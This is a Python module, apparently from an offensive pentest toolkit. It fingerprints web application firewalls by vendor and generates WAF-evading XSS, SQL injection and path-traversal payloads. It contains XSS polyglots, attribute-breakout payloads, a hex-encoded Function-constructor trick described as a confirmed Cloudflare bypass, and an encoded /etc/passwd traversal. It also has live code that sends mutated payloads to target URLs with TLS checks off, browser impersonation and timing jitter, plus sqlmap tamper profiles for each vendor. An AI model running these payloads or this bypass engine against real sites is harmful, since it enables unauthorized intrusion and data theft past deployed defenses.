"""
ghilliesuite_ex/waf_engine.py
─────────────────────────────
WAF Evasion & Payload Mutation Engine.

Three concerns:
  1. WAF Fingerprinting — identify the WAF vendor from response signals.
  2. Payload Mutation   — deterministic, offline, composable transformations.
  3. Bypass Verification — confirm a mutated payload actually passed the WAF.

All mutation functions are pure (no network I/O) and fully testable.
"""

from __future__ import annotations

import random
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any

# ── WAF Fingerprint Signals ──────────────────────────────────────────────────
# Each entry: (signal_type, pattern/keyword, vendor, weight)
# signal_type: "header" checks response headers, "body" checks response body.

_WAF_SIGNALS: list[tuple[str, str, str, int]] = [
    # ── Cloudflare ────────────────────────────────────────────────────────
    ("header", "cf-ray",                    "Cloudflare",  30),
    ("header", "server: cloudflare",        "Cloudflare",  30),
    ("header", "cf-cache-status",           "Cloudflare",  15),
    ("header", "cf-request-id",             "Cloudflare",  15),
    ("body",   "attention required",        "Cloudflare",  25),
    ("body",   "just a moment",             "Cloudflare",  25),
    ("body",   "ray id",                    "Cloudflare",  20),
    ("body",   "cloudflare",               "Cloudflare",  15),
    ("body",   "cf-chl-bypass",            "Cloudflare",  20),
    # ── Akamai ────────────────────────────────────────────────────────────
    ("header", "x-akamai-transformed",      "Akamai",      30),
    ("header", "akamai-grn",                "Akamai",      25),
    ("header", "server: akamaighost",       "Akamai",      30),
    ("body",   "akamai",                   "Akamai",      15),
    ("body",   "access denied",            "Akamai",      10),
    # ── Imperva / Incapsula ───────────────────────────────────────────────
    ("header", "x-iinfo",                   "Imperva",     30),
    ("header", "x-cdn: incapsula",          "Imperva",     30),
    ("body",   "incapsula",                "Imperva",     20),
    ("body",   "imperva",                  "Imperva",     20),
    ("body",   "_incap_ses",               "Imperva",     15),
    # ── Sucuri ────────────────────────────────────────────────────────────
    ("header", "x-sucuri-id",               "Sucuri",      30),
    ("header", "server: sucuri",            "Sucuri",      30),
    ("body",   "sucuri",                   "Sucuri",      15),
    ("body",   "cloudproxy",              "Sucuri",      20),
    # ── AWS WAF ───────────────────────────────────────────────────────────
    ("header", "x-amzn-requestid",          "AWS WAF",     15),
    ("header", "x-amz-cf-id",              "AWS WAF",     20),
    ("body",   "aws-waf",                  "AWS WAF",     25),
    ("body",   "request blocked",          "AWS WAF",     10),
    # ── ModSecurity ───────────────────────────────────────────────────────
    ("header", "server: modsecurity",       "ModSecurity", 30),
    ("body",   "modsecurity",              "ModSecurity", 25),
    ("body",   "mod_security",             "ModSecurity", 25),
    ("body",   "not acceptable",           "ModSecurity", 10),
]

# Block-page status codes commonly returned by WAFs
_WAF_BLOCK_CODES = frozenset({403, 406, 429, 503})


@dataclass
class WafFingerprint:
    """Result from WAF fingerprinting a target."""

    vendor: str = "Unknown"
    """Detected WAF vendor name, or 'Unknown'."""

    confidence: int = 0
    """Confidence score (0-100) based on accumulated signal weights."""

    evidence: list[str] = field(default_factory=list)
    """Human-readable evidence strings that contributed to the identification."""

    block_status_code: int = 0
    """HTTP status code from the WAF block page (if observed)."""

    detected: bool = False
    """True if any WAF was detected (confidence > 0)."""


def fingerprint_waf(
    status_code: int,
    headers_text: str,
    body_text: str,
) -> WafFingerprint:
    """
    Identify the WAF vendor from HTTP response signals.

    Args:
        status_code:  HTTP status code from the target response.
        headers_text: Raw response headers as a single string.
        body_text:    Response body (first ~2000 chars is sufficient).

    Returns:
        WafFingerprint with vendor, confidence, and evidence.
    """
    scores: dict[str, int] = {}
    evidence: dict[str, list[str]] = {}
    headers_lower = (headers_text or "").lower()
    body_lower = (body_text or "").lower()

    for signal_type, pattern, vendor, weight in _WAF_SIGNALS:
        haystack = headers_lower if signal_type == "header" else body_lower
        if pattern.lower() in haystack:
            scores[vendor] = scores.get(vendor, 0) + weight
            evidence.setdefault(vendor, []).append(
                f"{signal_type}:{pattern} (+{weight})"
            )

    if not scores:
        return WafFingerprint()

    # Pick the vendor with the highest accumulated score
    best_vendor = max(scores, key=scores.get)  # type: ignore[arg-type]
    raw_score = scores[best_vendor]
    confidence = min(100, raw_score)

    block_code = status_code if status_code in _WAF_BLOCK_CODES else 0

    return WafFingerprint(
        vendor=best_vendor,
        confidence=confidence,
        evidence=evidence.get(best_vendor, []),
        block_status_code=block_code,
        detected=True,
    )


# ═══════════════════════════════════════════════════════════════════════════════
# PAYLOAD MUTATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

# ── Individual mutation techniques (pure functions) ───────────────────────────

def _case_swap(payload: str) -> str:
    """Random cAse variations on alphabetic characters."""
    return "".join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in payload
    )


def _double_url_encode(payload: str) -> str:
    """Double URL-encode special characters: < becomes %253C."""
    first_pass = urllib.parse.quote(payload, safe="")
    return urllib.parse.quote(first_pass, safe="")


def _unicode_escape(payload: str) -> str:
    """Replace angle brackets and quotes with Unicode fullwidth equivalents."""
    table = {
        "<": "\uff1c",    # ＜
        ">": "\uff1e",    # ＞
        "'": "\uff07",    # ＇
        '"': "\uff02",    # ＂
        "(": "\uff08",    # （
        ")": "\uff09",    # ）
    }
    return "".join(table.get(c, c) for c in payload)


def _html_entity_mix(payload: str) -> str:
    """Mix decimal and hex HTML entities for angle brackets and ampersands."""
    table = {
        "<": random.choice(["&#60;", "&#x3C;", "&#x3c;"]),
        ">": random.choice(["&#62;", "&#x3E;", "&#x3e;"]),
        "&": random.choice(["&#38;", "&#x26;"]),
        '"': random.choice(["&#34;", "&#x22;"]),
        "'": random.choice(["&#39;", "&#x27;"]),
    }
    return "".join(table.get(c, c) for c in payload)


def _comment_inject_sql(payload: str) -> str:
    """Inject inline SQL comments between keyword characters."""
    keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP",
                "FROM", "WHERE", "AND", "OR", "ORDER", "GROUP", "HAVING",
                "SLEEP", "BENCHMARK", "WAITFOR"]
    result = payload
    for kw in keywords:
        if kw.lower() in result.lower():
            # Find the keyword case-insensitively and inject comments
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            match = pattern.search(result)
            if match:
                original = match.group(0)
                commented = "/**/".join(original)
                result = result[:match.start()] + commented + result[match.end():]
    return result


def _whitespace_fuzz(payload: str) -> str:
    """Replace standard spaces with alternative whitespace characters."""
    alternatives = ["\t", "\n", "\r", "\x0b", "\x0c", "/**/", "%09", "%0a"]
    return payload.replace(" ", random.choice(alternatives))


def _concat_split_sql(payload: str) -> str:
    """Split SQL string literals using concatenation."""
    keywords = ["SELECT", "UNION", "SLEEP", "BENCHMARK"]
    result = payload
    for kw in keywords:
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        match = pattern.search(result)
        if match:
            original = match.group(0)
            if len(original) > 2:
                mid = len(original) // 2
                split = f"'{original[:mid]}'/**/||/**/'{original[mid:]}'"
                result = result[:match.start()] + split + result[match.end():]
                break  # Only split one keyword to avoid over-mutation
    return result


def _tag_break_xss(payload: str) -> str:
    """Generate attribute-based XSS variants that break out of tag context."""
    variants = [
        '" onmouseover="alert(1)" x="',
        "' onfocus='alert(1)' autofocus='",
        '" onerror="alert(1)" src="x',
        "' onload='alert(1)' style='",
        '" onpointerover="alert(1)" class="',
    ]
    return random.choice(variants)


def _polyglot_xss(_payload: str) -> str:
    """Return a multi-context XSS polyglot payload."""
    polyglots = [
        "jaVasCript:/*--></title></style></textarea></script></xmp>"
        '<svg/onload="+/"/+/onmouseover=1/+/[*/[]}/+alert(1)//">',
        "-->'\">`<details/open/ontoggle=alert(1)>",
        "'-alert(1)-'",
        "</ScRiPt><img src=x onerror=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}",
    ]
    return random.choice(polyglots)


def _js_hex_function_obfuscation(payload: str) -> str:
    """
    Obfuscate JS calls using hex-encoded string literals within a Function constructor.
    Example: alert(1) -> Function("\x61\x6c\x65\x72\x74\x28\x31\x29")()
    Confirmed bypass for modern Cloudflare XSS rules.
    """
    # Identify the core JS part (e.g. alert(1)) while ignoring surrounding HTML tags
    # This is a naive extraction; ideally mutations work on pure payloads.
    clean = payload
    if "<script>" in payload.lower():
        clean = payload.lower().replace("<script>", "").replace("</script>", "").strip()
    
    hex_encoded = "".join(f"\\x{ord(c):02x}" for c in clean)
    return f'Function("{hex_encoded}")()'


def _null_byte_inject(payload: str) -> str:
    """Insert null bytes to bypass naive string filters."""
    return payload.replace("<", "%00<").replace("'", "%00'")


def _path_traversal_encode(payload: str) -> str:
    """Double-encode path traversal sequences."""
    return (payload
            .replace("../", "..%252f")
            .replace("..\\", "..%255c")
            .replace("/etc/passwd", "%2f%65%74%63%2f%70%61%73%73%77%64"))


# ── Vendor-specific mutation profiles ─────────────────────────────────────────
# Maps (vector, waf_vendor) → ordered list of mutation functions to apply.
# "any" vendor is the fallback when no specific profile exists.

_XSS_MUTATIONS = [_case_swap, _double_url_encode, _unicode_escape,
                   _html_entity_mix, _tag_break_xss, _polyglot_xss, 
                   _js_hex_function_obfuscation, _null_byte_inject]

_SQLI_MUTATIONS = [_case_swap, _comment_inject_sql, _whitespace_fuzz,
                    _concat_split_sql, _double_url_encode]

_LFI_MUTATIONS = [_double_url_encode, _path_traversal_encode, _null_byte_inject]

_VENDOR_PROFILES: dict[str, dict[str, list]] = {
    "Cloudflare": {
        "xss":  [_js_hex_function_obfuscation, _double_url_encode, _unicode_escape, _polyglot_xss, _tag_break_xss, _case_swap],
        "sqli": [_double_url_encode, _comment_inject_sql, _whitespace_fuzz, _case_swap],
        "lfi":  [_double_url_encode, _path_traversal_encode, _null_byte_inject],
    },
    "Akamai": {
        "xss":  [_case_swap, _html_entity_mix, _tag_break_xss, _unicode_escape],
        "sqli": [_comment_inject_sql, _case_swap, _concat_split_sql, _whitespace_fuzz],
        "lfi":  [_path_traversal_encode, _double_url_encode],
    },
    "Imperva": {
        "xss":  [_unicode_escape, _double_url_encode, _polyglot_xss, _case_swap],
        "sqli": [_whitespace_fuzz, _comment_inject_sql, _double_url_encode, _case_swap],
        "lfi":  [_double_url_encode, _null_byte_inject, _path_traversal_encode],
    },
    "Sucuri": {
        "xss":  [_double_url_encode, _case_swap, _tag_break_xss, _html_entity_mix],
        "sqli": [_comment_inject_sql, _concat_split_sql, _case_swap, _double_url_encode],
        "lfi":  [_path_traversal_encode, _double_url_encode],
    },
    "AWS WAF": {
        "xss":  [_unicode_escape, _polyglot_xss, _case_swap, _double_url_encode],
        "sqli": [_comment_inject_sql, _whitespace_fuzz, _case_swap, _concat_split_sql],
        "lfi":  [_double_url_encode, _path_traversal_encode, _null_byte_inject],
    },
    "ModSecurity": {
        "xss":  [_case_swap, _unicode_escape, _html_entity_mix, _polyglot_xss, _double_url_encode],
        "sqli": [_comment_inject_sql, _whitespace_fuzz, _concat_split_sql, _case_swap, _double_url_encode],
        "lfi":  [_double_url_encode, _path_traversal_encode, _null_byte_inject],
    },
}

# Generic fallback profiles
_GENERIC_PROFILES: dict[str, list] = {
    "xss":  _XSS_MUTATIONS,
    "sqli": _SQLI_MUTATIONS,
    "lfi":  _LFI_MUTATIONS,
}


def mutate_payload(
    payload: str,
    vector: str,
    waf_vendor: str = "Unknown",
    count: int = 5,
) -> list[str]:
    """
    Generate `count` mutated variants of a payload, tailored to the WAF vendor.

    Args:
        payload:     Original payload string to mutate.
        vector:      Attack vector type: 'xss', 'sqli', 'lfi', 'ssrf', etc.
        waf_vendor:  Detected WAF vendor name (from WafFingerprint.vendor).
        count:       Number of mutated variants to generate.

    Returns:
        List of mutated payload strings. May contain fewer than `count` if
        the payload is empty or no mutations are applicable.
    """
    if not payload or not payload.strip():
        return []

    vector_lower = vector.lower().strip()

    # Pick the mutation function list for this vendor+vector
    vendor_profile = _VENDOR_PROFILES.get(waf_vendor, {})
    mutations = vendor_profile.get(vector_lower)
    if not mutations:
        mutations = _GENERIC_PROFILES.get(vector_lower, _XSS_MUTATIONS)

    results: list[str] = []
    seen: set[str] = {payload}  # Avoid returning the original

    for i in range(count * 3):  # Over-generate to account for deduplication
        if len(results) >= count:
            break

        # Pick 1-2 mutations to compose
        n_compose = random.randint(1, min(2, len(mutations)))
        selected = random.sample(mutations, n_compose)

        mutated = payload
        for fn in selected:
            try:
                mutated = fn(mutated)
            except Exception:
                continue

        if mutated and mutated not in seen:
            seen.add(mutated)
            results.append(mutated)

    return results[:count]


# ═══════════════════════════════════════════════════════════════════════════════
# BYPASS VERIFICATION
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class BypassResult:
    """Result from a WAF bypass verification attempt."""

    success: bool = False
    """True if the payload appears to have bypassed the WAF."""

    status_code: int = 0
    """HTTP status code from the verification request."""

    waf_triggered: bool = False
    """True if WAF signatures were still detected in the response."""

    evidence: str = ""
    """Human-readable evidence of the bypass (or block)."""

    payload_used: str = ""
    """The mutated payload that was tested."""


async def verify_bypass(
    url: str,
    parameter: str,
    payload: str,
    auth_headers: dict[str, str] | None = None,
    timeout: float = 10.0,
    baseline_status: int = 403,
) -> BypassResult:
    """
    Send a mutated payload and check if it bypassed the WAF.

    Compares the response against the WAF block baseline:
    - If status code differs from baseline (e.g., 200 vs 403) → likely bypass
    - If no WAF signatures in response → confirmed bypass

    Args:
        url:              Target URL with query parameters.
        parameter:        Query parameter name to inject into.
        payload:          Mutated payload value.
        auth_headers:     Optional dict of auth headers to include.
        timeout:          Request timeout in seconds.
        baseline_status:  Status code from the WAF block response.

    Returns:
        BypassResult with success flag and evidence.
    """
    try:
        from curl_cffi import requests as _requests
        use_curl = True
    except ImportError:
        use_curl = False
        import httpx as _requests

    # Build the URL with the payload injected
    injected_url = _inject_payload(url, parameter, payload)
    if not injected_url:
        return BypassResult(evidence=f"Could not inject into parameter '{parameter}'")

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    if auth_headers:
        headers.update(auth_headers)

    try:
        from ghilliesuite_ex.agents.base import _run_in_thread
        import asyncio

        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        def _do_request():
            if use_curl:
                try:
                    session = _requests.Session(impersonate="chrome120", verify=False)
                except TypeError:
                    session = _requests.Session(verify=False)
                with session:
                    return session.get(
                        injected_url,
                        timeout=timeout,
                        allow_redirects=False,
                        headers=headers
                    )
            else:
                # Fallback path requires synchronous execution in _run_in_thread
                session = _requests.Client(verify=False)
                with session:
                    return session.get(
                        injected_url,
                        timeout=timeout,
                        follow_redirects=False,
                        headers=headers
                    )

        resp = await _run_in_thread(_do_request)
        
        # Dynamic Jitter: Faster for turbo, slower for stealth/normal
        from ghilliesuite_ex.config import cfg as _cfg
        delay = random.uniform(0.1, 0.4) if _cfg.turbo_mode else random.uniform(0.7, 2.0)
        await asyncio.sleep(delay)
    except Exception as exc:
        return BypassResult(evidence=f"Request error: {exc}", payload_used=payload)

    # Fingerprint the response to check if WAF is still blocking
    resp_headers = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
    body_snippet = (resp.text or "")[:2000]
    fp = fingerprint_waf(resp.status_code, resp_headers, body_snippet)

    # Determine bypass success
    body_lower = body_snippet.lower()
    challenge_keywords = ["verifying your connection", "cloudflare-nginx", "just a moment", "attention required"]
    has_challenge = any(kw in body_lower for kw in challenge_keywords)

    if 300 <= resp.status_code < 400 or resp.status_code in {403, 429} or has_challenge:
        success = False
    else:
        status_changed = resp.status_code != baseline_status and resp.status_code not in _WAF_BLOCK_CODES
        waf_gone = not fp.detected
        success = status_changed or waf_gone

    evidence_parts = [
        f"Status: {resp.status_code} (baseline: {baseline_status})",
        f"WAF detected: {fp.vendor if fp.detected else 'none'}",
    ]
    if success:
        evidence_parts.append("BYPASS CONFIRMED")
    else:
        evidence_parts.append("Still blocked")

    return BypassResult(
        success=success,
        status_code=resp.status_code,
        waf_triggered=fp.detected,
        evidence=" | ".join(evidence_parts),
        payload_used=payload,
    )


def _inject_payload(url: str, parameter: str, payload: str) -> str:
    """Inject a payload value into a URL query parameter."""
    parsed = urllib.parse.urlsplit(url)
    if not parsed.query:
        return ""
    qsl = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    replaced = False
    new_qsl: list[tuple[str, str]] = []
    for key, value in qsl:
        if key == parameter and not replaced:
            new_qsl.append((key, payload))
            replaced = True
        else:
            new_qsl.append((key, value))
    if not replaced:
        return ""

    def _quote_keep_percent(s, safe, encoding, errors):
        return urllib.parse.quote(s, safe=safe + "%", encoding=encoding, errors=errors)

    new_query = urllib.parse.urlencode(new_qsl, doseq=True, quote_via=_quote_keep_percent)
    return urllib.parse.urlunsplit(
        (parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment)
    )


# ── SQLMap tamper script recommendations per WAF vendor ───────────────────────
SQLMAP_TAMPER_PROFILES: dict[str, str] = {
    "Cloudflare":  "between,randomcase,space2comment,charencode",
    "Akamai":      "between,randomcase,space2comment,greatest",
    "Imperva":     "randomcase,space2comment,charencode,equaltolike",
    "Sucuri":      "between,randomcase,space2comment",
    "AWS WAF":     "space2comment,randomcase,charencode,between",
    "ModSecurity": "space2comment,between,randomcase,charencode,equaltolike",
    "Unknown":     "between,randomcase,space2comment",
}
